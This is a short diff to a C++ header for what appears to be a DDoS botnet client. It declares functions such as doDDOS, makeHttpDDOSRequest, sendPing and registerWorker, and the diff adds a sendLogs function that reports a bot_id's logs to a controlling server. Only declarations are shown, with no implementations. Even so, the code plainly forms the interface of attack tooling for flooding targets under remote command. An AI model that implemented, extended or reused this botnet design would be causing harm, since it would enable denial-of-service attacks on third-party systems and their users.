@@ -5,6 +5,7 @@
 #include "worker.h"
 #include <netdb.h>
 #include "worker.h"
+#include <vector>
 #include "task.h"
 
 Worker registerWorker(const char* serverIP, int serverPort, in_addr ipAddress, std::string cpu, std::string ramInfo);
@@ -20,5 +21,6 @@ bool doDDOS(Task task);
 void makeHttpDDOSRequest(std::string address, bool log);
 unsigned short checksum(unsigned short* buf, int len);
 void sendPing(const char* address);
+void sendLogs(const char* serverIP, int serverPort, std::vector<std::string> logs, int bot_id);
 
 #endif
